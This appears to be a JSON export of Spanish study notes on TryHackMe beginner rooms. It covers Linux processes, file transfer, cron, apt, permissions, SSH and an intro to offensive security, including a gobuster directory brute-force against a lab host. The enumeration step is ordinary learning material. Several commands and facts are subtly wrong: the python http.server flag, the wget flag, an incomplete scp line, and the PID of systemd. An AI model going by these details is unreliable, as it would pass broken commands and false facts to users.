    "content": "Los procesos son programas que est√°n corriendo en nuestra m√°quina. Son controlados por el kernel y cada proceso tiene un ID asociado llamado PID (Process ID). Estos son incrementales (el proceso n¬∫ 60 tendr√° un PID 60).\n\n<h2>Viendo Procesos</h2>\nPodemos usar el comando `ps` para ver una lista de los procesos corriendo con informaci√≥n adicional como el c√≥digo de estado, la sesi√≥n que lo corre y el nombre del programa que lo corre.\n\n![[025.png]]\n\n>[!NOTE] Date cuenta de que en la foto de arriba un proceso tiene el PID 204 y el siguiente 205.\n\nPara ver aquellos procesos que corren otros usuarios o aquellos que no corren desde una sesi√≥n, sino desde el sistema, por ejemplo, podemos usar `ps aux`.\n\n![[026.png]]\n\nOtro comando muy √∫til es `top`. Este te da informaci√≥n en tiempo real (actualizada cada 10 segundos o cuando nos movemos con las flechas direccionales).\n\n![[027.png]]\n\n-----------------\n<h2>Controlando Procesos</h2>\nPodemos mandar se√±ales que terminen procesos. Hay una gran variedad para ello y var√≠an en la \"limpieza\" con la que lo hacen. Para matar un proceso utilizamos `kill <PID>`. Algunas de las se√±ales que podemos mandar al matar los procesos son:\n\n- SIGTERM: Matamos el proceso pero le permitimos hacer limpieza antes de ello.\n- SIGKILL: Matamos el proceso abruptamente.\n- SIGSTOP: Paramos o suspendemos el proceso.\n\n----------------\n<h2>¬øC√≥mo empiezan los procesos?</h2>\nComenzaremos hablando de los \"namespaces\". El sistema operativo los usa para dividir los recursos disponible (como CPU, RAM o prioridad).\n\nEstos son geniales para la seguridad pues es una manera de aislar procesos unos de otros. S√≥lo aquellos que est√©n en el mismo namespace ser√°n capaces de verse unos a otros.\n\nPreviamente hemos hablado de c√≥mo funcionan los PID. El proceso con PID 0 es el proceso que arranca el sistema. Este proceso es el *systemd*.\n\nCualquier programa o proceso que lancemos ser√° lo que conocemos como un \"child\" (hijo) del proceso **systemd**. Esto quiere decir que est√° controlado por systemd y que compartir√° los mismos recursos.\n\n![[028.png]]\n\n--------------------\n<h2>Haciendo que los procesos empiecen en el arranque</h2>\nAlgunas aplicaciones puedes ser arrancadas en el inicio del sistema. Por ejemplo, servidores web, bases de datos o servidores de transferencia.\n\nEn el siguiente ejemplo arrancaremos Apache2 de manera manual y luego le estaremos diciendo a Apache2 que arranque al inicio.\n\nEl comando `systemctl` nos permite interactuar con el proceso/daemon systemd. Este comando sigue el siguiente formato: `systemctl <opci√≥n> <servicio>`.\n\nPara arrancar apache, usar√≠amos `systemctl start apache2`. Si quisi√©ramos pararlo sustituir√≠amos start por stop.\n\nPodemos usar `systemctl` para:\n\n- start\n- stop\n- enable (hace que empiece en el arranque)\n- disable (hace que deje de empezar en el arranque)\n\n--------------------\n<h2>Introducci√≥n al Primer y Segundo Plano</h2>\nLos procesos pueden correr en dos estados: en primer plano (foreground) o en segundo plano (background). Al hacer `echo \"Hi THM\"` esperamos ver el output inmediatamente pero al a√±adir `&` se nos da el PID en su lugar.\n\n![[029.png]]\n\nEsto es √∫til para comandos como copiar grandes cantidades de archivos, porque mientras se ejecuta en segundo plano podemos seguir haciendo cosas. Tambi√©n podemos usar `Ctrl+Z` para llevar a un proceso al segundo plano.\n\n----------------\n<h2>Llevando un proceso al primer plano</h2>\nAhora que hemos visto c√≥mo llevar un proceso al segundo plano, es importante saber c√≥mo traerlo de vuelta. Para ello podemos utilizar `fg` (foreground).",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. General-Useful Utilities",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-3/3-general-useful-utilities/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 3/3. General-Useful Utilities.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 3",
    "content": "<h2>Descargar archivos (wget)</h2>\nUna funcionalidad bastante √∫til de la computaci√≥n es la capacidad de transferir archivos. Para descargar programas, scripts o incluso im√°genes, vamos a cubrir la herramienta `wget`. \n\nEste comando nos permite descargar archivos web v√≠a HTTP. Simplemente tenemos que proporcionar la URL del recurso. Por ejemplo si quisiera descargar un archivo `web_file.txt`, suponiendo que se la direcci√≥n URL: `wget https://assets.tryhackme.com/additional/linux-fundamentals/part3/web_file.txt`.\n\n---------------------\n<h2>Transferir archivos desde tu Host - SCP (SSH)</h2>\nSecure CoPy (SCP) es una manera de copiar archivos de manera segura. Al contrario que el comando `cp`, este te permite mandar archivos entre dos ordenadores usando SSH. Te permite:\n\n- Copiar archivos y directorios desde tu ordenador a uno remoto.\n- Copiar archivos y directorios desde un ordenador remoto a tu ordenador.\n\nTomando como premisa que conocemos nombre de usuario y contrase√±a para un usuario del sistema remoto y un usuario del sistema local, para hacerlo necesitamos la siguiente informaci√≥n:\n\n1. La direcci√≥n IP de la m√°quina remota.\n2. Un usuario en la m√°quina remota.\n3. Nombre del archivo en la m√°quina local.\n4. Nombre que le pondremos al archivo en la m√°quina remota.\n\n`scp important.txt ubuntu@192.168.1.30:/home/ubuntu/transferred.txt`\n\nPara la manera inversa (transferir un archivo desde un equipo remoto a un equipo local):\n\n`scp ubuntu@192.168.1.30:/home/ubuntu/transferred.txt`\n\n-------------------\n<h2>Servir archivos desde tu Host - WEB</h2>\nLas m√°quinas Linux vienen preparadas con python3. Este proporciona un m√≥dulo f√°cil de usar llamado `\"HTTPServer\"`. Lo que hace es convertir tu ordenador en un servidor web de manera r√°pida y sencilla para hostear tus archivos, que pueden ser entonces descargados con `curl` o `wget`.\n\n`HTTPServer` correr√° el servidor en el directorio en el que ejecutaste el comando. El comando que debes utilizar para ello es: `python3 -h http.server <puerto>`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Terminal Text Editors",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-3/2-terminal-text-editors/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 3/2. Terminal Text Editors.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 3",
    "content": "Durante las lecciones que hemos visto, s√≥lo hemos llenado archivos de texto con una combinaci√≥n entre `echo`, `>` y `>>`. Esta no es una manera eficiente de manejar textos. Para ello, existen editores de terminal.\n\n<h2>NANO</h2>\nEs f√°cil de empezar con nano. Para crear un archivo vale con hacer `nano <nombre_archivo>`. Puedes navegar por el texto con las flechas direccionales.\n\nNano tiene unas cuantas funcionalidades f√°ciles de recordar y  que cubren la mayor√≠a de acciones que querr√≠as hacer:\n\n- Buscar por texto.\n- Copiar y Pegar.\n- Ir a una l√≠nea por n√∫mero.\n- Averiguar qu√© n√∫mero tiene la l√≠nea actual.\n\n>[!NOTE] La letra `Ctrl` est√° representada por `^`.\n\n-------------------\n<h2>VIM</h2>\nVIM es un editor de textxo mucho m√°s avanzado. La curva de aprendizaje es bastante pronunciada y con tiempo se pueden hacer muchas cosas.\n\n- Customizable: Puedes modificar los atajos de teclado como quieras.\n- Resalto de sintaxis: Es √∫til sobre todo si estamos escribiendo c√≥digo.\n- Uso: VIM funciona en todas las terminales.\n- Recursos: Hay m√°s recursos como tablas, tutoriales i.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Linux Fundamentals 3",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-3/0-linux-fundamentals-3/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 3/0. Linux Fundamentals 3.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 3",
    "content": "[[Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 3/1. Introduction|1. Introduction]]\n[[2. Terminal Text Editors]]\n[[3. General-Useful Utilities]]\n[[4. Processes 101]]\n[[5. Maintaining your System - Automation]]\n[[6. Maintaining your System - Package Management]]\n[[7. Maintaining your System - Logs]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Maintaining your System - Automation",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-3/5-maintaining-your-system-automation/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 3/5. Maintaining your System - Automation.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 3",
    "content": "Los usuarios pueden querer programar una cierta acci√≥n o tarea para que tome lugar una vez que el sistema se haya arrancado por ejemplo comandos que hacen backups (copias de seguridad).\n\nVamos a estar hablando de los procesos `cron`. Pero m√°s espec√≠ficamente, de c√≥mo podemos interactuar con ellos v√≠a el uso de `crontabs`. Crontabs es uno de los procesos que se ejecuta en el arranque.\n\nLos `crontabs` requieren de exactamente 6 valores espec√≠ficos:\n\n| Valor | Descripci√≥n                     |\n| ----- | ------------------------------- |\n| MIN   | En qu√© minuto ejecutarlo        |\n| HOUR  | En qu√© hora ejecutarlo          |\n| DOM   | Qu√© d√≠a del mes ejecutarlo      |\n| MON   | Qu√© mes del a√±o ejecutarlo      |\n| DOW   | Qu√© d√≠a de la semana ejecutarlo |\n| CMD   | El comando a ejecutar           |\nSe ver√≠a tal que:\n\n```c\n0 */12 * * * cp -R /home/cmnatic/Documents /var/backups/\n```\n\nEsto indica que se debe copiar el contenido en la ruta establecida cada 12 horas.\n\nComo puede ser confuso existen recursos como [Crontab Generator](https://crontab-generator.org/) o [Cron Guru](https://crontab.guru/) que nos ayudan cuando no nos sale.\n\nPara editar el crontab podemos usar `crontab -e`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Maintaining your System - Package Management",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-3/6-maintaining-your-system-package-management/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 3/6. Maintaining your System - Package Management.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 3",
    "content": "<h2>Introduciendo Paquetes y Repositorios de Software</h2>\nCuando los desarrolladores de software quieren subir su trabajo a la comunidad pueden subirlo a un repositorio \"apt\". Si es aprobado, sus programas y herramientas ser√°n compartidos.\n\n![[031.png]]\n\nLos archivos listados en `/etc/apt/` sirven como gateway/registro. Puedes a√±adir repositorios de la comunidad a tu sistema operativo haciendo `add-apt-repositorio`.\n\n------------------\n<h2>Controlando tus repositorios (a√±adiendo y eliminando)</h2>\nNormalmente usamos apt para instalar software en nuestro sistema. Apt es un comando de un gestor de paquetes y contiene una gran cantidad de herramientas.\n\nEs seguro descargar este software por las claves GPG (GNU Privacy Guard). Estas son usadas por los desarrolladores y si a la hora de descargar estos paquetes las claves no coinciden no se descargar√°.\n\n1. Empezaremos descargando la clave GPG de los desarrolladores de Sublime Text 3: `wget -q0 - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -`.\n2. Ahora que hemos a√±adido la llave a nuestra lista de claves confiables, podemos a√±adir el repositorio de Sublime Text 3 a nuestra lista de fuente apt.\n\t1. Crearemos un archivo llamado **sublime-text.list** en **/etc/apt/sources.list.d** e introduciremos la informaci√≥n as√≠.\n\t   \n```bash\nvim sublime-text.list\n\ndentro del archivo escribimos:\n\ndeb https://download.sublimetext.com/ apt/stable/\n```\n\n3. Despu√©s de a√±adir esta l√≠nea necesitamos actualizar apt: `apt update`.\n4. Ahora ya podemos instalar el software: `apt install sublime-text`.\n5. Para borrar: `add-apt-repository --remove ppa:PPA_Name/ppa` o borrar manualmente el archivo que hemos creado antes.\n6. Una vez borrado podemos usar `apt remove <nombre_software>`, por ejemplo, `apt remove sublime-text`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Maintaining your System - Logs",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-3/7-maintaining-your-system-logs/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 3/7. Maintaining your System - Logs.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 3",
    "content": "Hemos tocado brevemente los archivos de log y d√≥nde los podemos encontrar en [[5. Searching for files]].\n\nA continuaci√≥n se ven algunos logs de los siguientes procesos:\n\n- Un servidor web apache2.\n- Logs para el servicio fail2ban, el cuales usado para monitorizarataques de fuerza bruta.\n- El servicio UFW (firewall).\n\n![[032.png]]\n\nEstos logs son una excelente manera de monitorizar la salud de tu sistema y procesos. Los dos tipos de logs que vemos debajo son:\n\n- Access logs.\n- Error logs.\n\n![[033.png]]\n\nHay, tambi√©n otros logs que guardan otro tipo de informaci√≥n, como intentos de autentificaci√≥n.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "6. Common Directories",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-2/6-common-directories/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 2/6. Common Directories.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 2",
    "content": "<h2>/etc</h2>\nViene de etcetera. Es uno de los m√°s importantes. Este directorio es un lugar com√∫n en el sistema para almacenar archivos que ser√°n usados por el sistema operativo.\n\nPor ejemplo, el archivo sudoers que contiene una lista de usuarios y grupos que tienen permiso para hacer \"sudo\".\n\nTambi√©n est√°n los archivos \"passwd\" y \"shadow\". Estos son especiales de Linux porque guardan contrase√±as encriptadas para cada usuario.\n\n```bash\ntryhackme@linux2:/etc$ ls\nshadow passwd sudoers sudoers.d\n```\n\n-----------------\n<h2>/var</h2>\nViene de variable data. Almacena informaci√≥n que es frecuentemente accedida o escrita por servicios o aplicaciones que corren en el sistema, por ejemplo, los archivos de log son escritos en **/var/log**.\n\n```bash\ntryhackme@linux2:/var$ ls\nbackups log opt tmp\n```\n\n-----------------------\n<h2>/root</h2>\nRoot es la carpeta \"/home\" del usuario root.\n\n```bash\nroot@linux2:~# ls\nmyfile myfolder passwords.xlsx\n```\n\n---------------------\n<h2>/tmp</h2>\nEs un directorio que viene de \"temporary\". Es vol√°til, lo que implica que lo que haya dentro se borra al apagarse la m√°quina. Funciona de manera similar a una RAM.\n\nCualquier usuario puede escribir en este fichero por defecto.\n\n```bash\nroot@linux2:/tmp# ls\ntodelete trash.txt rubbish.bin\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-2/1-introduction/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 2/1. Introduction.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 2",
    "content": "En esta segunda parte de Linux Fundamentals estaremos aplicando los conocimientos adquiridos en la primera parte. Adem√°s, en esta segunda parte estaremos:\n\n- Desbloqueando el potencial de los primeros comandos introduciendo flags y argumentos.\n- Avanzando tu conocimiento del sistema de ficheros para realizar comandos m√°s √∫tiles como copiar y mover archivos.\n- Descubriendo c√≥mo se maneja el acceso a archivos y ficheros y c√≥mo podemos determinar nuestro acceso.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Permissions 101",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-2/5-permissions-101/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 2/5. Permissions 101.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 2",
    "content": "Como ya habr√°s comprobado, ciertos usuarios no pueden acceder a seg√∫n qu√© archivos o ficheros.\n\nYa vimos c√≥mo extender comandos con switches como `ls -lh`.\n\n```bash\ntryhackme@linux2:~$ ls -lh\n-rw-r--r-- 1 cmnatic cmnatic 0 Feb 19 10:37 file1\n-rw-r--r-- 8 cmnatic cmnatic 0 Feb 19 10:37 file2\n```\n\nAunque parecen intimidantes, en verdad se leen de manera f√°cil:\n\n- Read (r)\n- Write (w)\n- Execute (x)\n\nEstas letras marcan las acciones permitidas a cada grupo.\n\n-------------------\n<h2>Diferencias entre Usuarios y Grupos</h2>\nUna de las cosas tan geniales de Linux es que mientras un usuario puede tener un cierto conjunto de permisos sobre un archivo o fichero, otro grupo de usuarios puede tener los mismos o diferentes.\n\n------------------\n<h2>Cambiar entre Usuarios</h2>\nEs muy f√°cil gracias al comando `su` (switch user). Al hacerlo puedes usar el switch -l para conseguir las variables de entorno, y loguearnos de una manera muy familiar.\n\n```bash\ntryhackme@linux2:~$ su user2\nPassword:\nuser2@linux2:/home/tryhackme$\n```\n\nAl usar `su` para cambiar a user2, la nueva sesi√≥n sobrecae en  el directorio anterior al cambio.\n\n```bash\ntryhackme@linux2:~$ su -l user2\nPassword:\nuser2@linux2:~$ pwd\nuser2@:/home/user2$\n```\n\nMientras que al usar `-l`, esta recae en la ruta home del nuevo usuario.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Linux Fundamentals 2",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-2/0-linux-fundamentals-2/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 2/0. Linux Fundamentals 2.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 2",
    "content": "[[Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 2/1. Introduction|1. Introduction]]\n[[2. Accessing Your Linux Machine Using SSH]]\n[[3. Introduction to Flags and Switches]]\n[[4. Filesystem Interaction Continued]]\n[[5. Permissions 101]]\n[[6. Common Directories]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Accessing Your Linux Machine Using SSH",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-2/2-accessing-your-linux-machine-using-ssh/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 2/2. Accessing Your Linux Machine Using SSH.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 2",
    "content": "Secure SHell (SSH) es un protocolo usado para conectarse a m√°quinas de manera remota.\n\n-----------\n<h2>¬øQu√© es SSH y c√≥mo funciona?</h2>\nEs un protocolo entre dispositivos de forma encriptada. Usando criptograf√≠a, cualquier input humanamente le√≠ble, se encripta para su transporte por la red. Siendo desencriptado una vez llega a la m√°quina remota.\n\n![[022.png]]\n\nDe momento s√≥lo necesitamos entender que:\n\n- SSH nos permite ejecutar comandos de manera remota desde otro dispositivo.\n- Cualquier informaci√≥n mandada entre dispositivos es encriptada.\n\n--------------------------\n<h2>Usando SSH para loguearnos en nuestra m√°quina Linux</h2>\nEl uso de SSH es muy sencillo, s√≥lo necesitamos proporcionar dos cosas:\n\n1. La IP de la m√°quina remota.\n2. Credenciales correctas para validar el login.\n\nPara esta lecci√≥n nos conectaremos como el usuario tryhackme cuya contrase√±a es tryhackme. La sintaxis es: `ssh <usuario>@<direccion_ip>`.\n\n1. ![[024.png]]\n2. ![[023.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Filesystem Interaction Continued",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-2/4-filesystem-interaction-continued/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 2/4. Filesystem Interaction Continued.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 2",
    "content": "Hemos cubierto algunos de los comandos fundamentales al interactuar con el sistema de ficheros en una m√°quina Linux. En esta lecci√≥n vamos a aprender comandos para:\n\n- Crear archivos y ficheros.\n- Mover archivos y ficheros.\n- Borrar archivos y ficheros.\n\n| Comando | Nombre completo | Prop√≥sito                      |\n| ------- | --------------- | ------------------------------ |\n| touch   | touch           | Crear un archivo (vac√≠o)       |\n| mkdir   | make directory  | Crear un directorio            |\n| cp      | copy            | Copiar un archivo o directorio |\n| mv      | move            | Mover un archivo o directorio  |\n| rm      | remove          | Borrar un archivo o directorio |\n| file    | file            | Determina el tipo de archivo   |\n\n>[!TIP] Similar al comando cat donde pod√≠amos usar rutas absolutas, con estos comandos tambi√©n podemos.\n\n----------------------------\n<h2>Crear archivos y ficheros</h2>\nCrear archivos y directorios en Linux es un proceso sencillo. Primero, veremos c√≥mo crear un archivo .\n<h3>Touch</h3>\nEl comando touch admite exactamente un argumento: el nombre del archivo. Es importante notar que touch s√≥lo crea el archivo en blanco, ser√≠a necesaria la utilizaci√≥n de comandos como echo o editores de texto como vim para rellenarlo.\n\n```bash\ntryhackme@linux2:~$ ls\nfolder1\ntryhackme@linux2:~$ touch nota\ntryhackme@linux2:~$ ls\nfolder1 nota\n```\n\n<h3>Mkdir</h3>\nUn proceso similar se sigue para crear directorios. Para ello utilizaremos el comando mkdir:\n\n```bash\ntryhackme@linux2:~$ ls\nfolder1 nota\ntryhackme@linux2:~$ mkdir miDirectorio\ntryhackme@linux2:~$ ls\nfolder1 miDirectorio nota\n```\n\n-------------------------\n<h2>Borrar archivos y ficheros (rm)</h2>\nEl comando `rm` (remove) es especial con respecto a los que ya hemos visto. Para borrar un archivo vale con hacer `rm <nombre_del_archivo>`. Sin embargo, para poder borrar directorios necesitamos incluir el switch `-R` (recursivo). Esto ocurre porque necesitamos decirle que vaya buscando directorios dentro de esos directorios y de cada uno elimine todos los archivos.\n\n>[!NOTE] Si el directorio est√° vac√≠o, si que se puede borrar sin `-R`.\n\n```bash\ntryhackme@linux2:~$ rm note\ntryhackme@linux2:~$ ls\nfolder1 miDirectorio\n```\n\n```bash\ntryhackme@linux2:~$ rm -R miDirectorio\ntryhackme@linux2:~$ ls\nfolder1\n```\n\n------------------------\n<h2>Copiar y mover archivos y ficheros</h2>\nCopiar y mover archivos es una funcionalidad importante de Linux.\n<h3>Cp</h3>\nEl comando `cp` (copy), toma dos argumentos:\n\n1. El nombre del archivo existente (el que se va a copiar).\n2. El nombre que queremos darle a la copia.\n\n```bash\ntryhackme@linux2:~$ echo \"Esto es una nota\" > nota\ntryhackme@linux2:~$ cp nota nota2\ntryhackme@linux2:~$ ls\nfolder1 nota nota2\n```\n\n<h3>Mv</h3>\nMover un archivo requiere dos argumentos, como copiarlos. No solo puede usarse `mv` para mover un archivo o directorio sino tambi√©n para renombrarlo.\n\n```bash\ntryhackme@linux2:~$ mv nota2 nota3\ntryhackme@linux2:~$ ls\nfolder1 nota nota3\n```\n\n----------------------------\n<h2>Determinando el tipo de archivo</h2>\nLo que es confuso y a veces coge a las personas de imprevisto es que las extensiones en Linux no tienen significado, podemos llamar a un archivo de texto .png y nada cambiar√°, seguir√° siendo oun archivo de texto. \n\nPara saber delante de qu√© tipo de archivo estamos tenemos el comando file, el cua nos devuelve informaci√≥n sobre el archivo en cuesti√≥n:\n\n```bash\ntryhackme@linux2:~$ file nota\nnota: ASCII text\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Introduction to Flags and Switches",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/4-linux-fundamentals/linux-fundamentals-part-2/3-introduction-to-flags-and-switches/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/4. Linux Fundamentals/Linux Fundamentals Part 2/3. Introduction to Flags and Switches.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 4. Linux Fundamentals > Linux Fundamentals Part 2",
    "content": "La mayor√≠a de los comandos permiten argumentos. Estos son identificados con un gui√≥n y una cierta palabra clave o switches.\n\nAl usar un comando, mientras no se haya especificado nada m√°s, este efectuar√° su comportamiento por defecto. Por ejemplo `ls` lista los elementos de un directorio. Sin embargo, los archivos ocultos no se muestran. Podemos usar flags para modificar el comportamiento de los comandos.\n\nPor ejemplo, `-a` (abreviatura para `--all`) podemos ver incluso los archivos ocultos (los que empiezan con un punto).\n\n```bash\ntryhackme@linux2:~$ ls\nfolder1\ntryhackme@linux2:~$ ls -a\n.hiddenfolder folder1\n```\n\nLos comandos que aceptan argumentos tienen la flag `--help` o `-h`. Esta opci√≥n listar√° las posibles opciones que tiene el comando para realizar.\n\nEsta opci√≥n es, en realidad, un output formateado llamado manual page (p√°gina de manual).\n\nLas p√°ginas de manual son excelentes fuentes de informaci√≥n. Para acceder a esta informaci√≥n podemos usar el comando `man` o las flags de help que hemos visto antes:\n\n```bash\ntryhackme@linux2:~$ man ls\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Hacking my first machine",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/1-offensive-security-intro/2-hacking-my-first-machine/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/1. Offensive Security Intro/2. Hacking my first machine.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 1. Offensive Security Intro",
    "content": "En esta *room* se ha creado una m√°quina virtual llamada **Fakebank**.\n\n1. ![[Pasted image 20250410141122.png]]\n2. ![[Pasted image 20250410142116.png]]Con el comando siguiente:\n\t\n```bash\ngobuster -u http://fakebank.thm -w Desktop/wordlist.txt dir\n```\n\t1. -u: Indicamos la URL.\n\t2. -w: Indicamos el diccionario\n\t3. dir: Le especificamos que busque directorios.\n\n3. ![[Pasted image 20250410142253.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "1. What is Offensive Security",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/1-offensive-security-intro/1-what-is-offensive-security/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/1. Offensive Security Intro/1. What is Offensive Security.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 1. Offensive Security Intro",
    "content": "><em>\"Para vencer a un hacker necesitas pensar como √©l\"</em>\n\nA continuaci√≥n una gu√≠a para hackear nuestra primera web en un entorno seguro y legal.\nAunque antes debemos responder:\n\n1. Cu√°l de las siguientes opciones representa mejor el proceso donde simulas ser un hacker para encontrar vulnerabilidades en un sistema?\n>Seguridad Ofensiva",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Offensive Security Intro",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/1-offensive-security-intro/0-offensive-security-intro/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/1. Offensive Security Intro/0. Offensive Security Intro.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 1. Offensive Security Intro",
    "content": "[[1. What is Offensive Security]]\n[[2. Hacking my first machine]]\n[[3. Careers in Cyber Security]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "3. Careers in Cyber Security",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/1-offensive-security-intro/3-careers-in-cyber-security/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/1. Offensive Security Intro/3. Careers in Cyber Security.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 1. Offensive Security Intro",
    "content": "Para aprender ciberseguridad de manera correcta es importante romperlo en pasos m√°s sencillos. Construir un h√°bito todos los d√≠as suele ser una muy buena manera de progresar.\n\nHay tres ramas principales a la hora de trabajar de nuestra profesi√≥n:\n1. Penetration Tester: Responsable de poner a prueba la tecnolog√≠a y productos y encontrar vulnerabilidades explotables.\n2. Red Teamer: Juega el rol de un adversario que ataca la organizaci√≥n y provee feedback.\n3. Security Engineer: Dise√±a, monitoriza y mantiene controles de seguridad, redes y sistemas para prevenir los ciberataques.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. Careers in Cyber",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/3-careers-in-cyber/0-careers-in-cyber/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/1. Pre Security/1. Introduction to cybersecurity/3. Careers in Cyber/0. Careers in Cyber.md",
    "breadcrumb": "THM > 0. Pre Career > 1. Pre Security > 1. Introduction to cybersecurity > 3. Careers in Cyber",
    "content": "[[1. Introducci√≥n]]\n[[2. Analista de seguridad]]\n[[3. Ingeniero de seguridad]]\n[[4. Respondedor de Incidentes]]\n[[5. Examinador Forense Digital]]\n[[6. Analista de Malware]]\n[[7. Penetration Tester]]\n[[8. Red Teamer]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "2. Analista de seguridad",
    "path": "/apuntes/thm/0-pre-career/1-pre-security/1-introduction-to-cybersecurity/3-careers-in-cyber/2-analista-de-seguridad/",
